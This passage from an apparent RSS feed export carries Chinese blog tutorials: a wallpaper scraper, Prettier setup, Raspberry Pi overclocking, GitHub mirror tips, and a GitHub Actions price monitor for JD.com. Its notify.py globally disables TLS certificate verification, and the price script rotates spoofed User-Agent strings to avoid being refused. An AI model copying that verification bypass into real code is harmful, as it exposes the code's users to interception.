href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/412390150?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"中秋节，你最难忘的一次团圆是什么样的？","date":"2021-09-22 09:22:51","description":"\n<p>他们，在边疆、在海岛、在深山密林、在大漠沙场……他们坚守战位，用忠诚书写对家国安康的祝愿。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-jun-wang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国军网</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/487438148/answer/2132277635?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">17 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/486535560?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你们的家乡过中秋节都吃什么？</a><br><a href=\"http://www.zhihu.com/question/345822451?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">中秋节，你快乐吗？怎么过的呢？</a><br>\n","link":"http://www.zhihu.com/question/487438148/answer/2132277635?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span 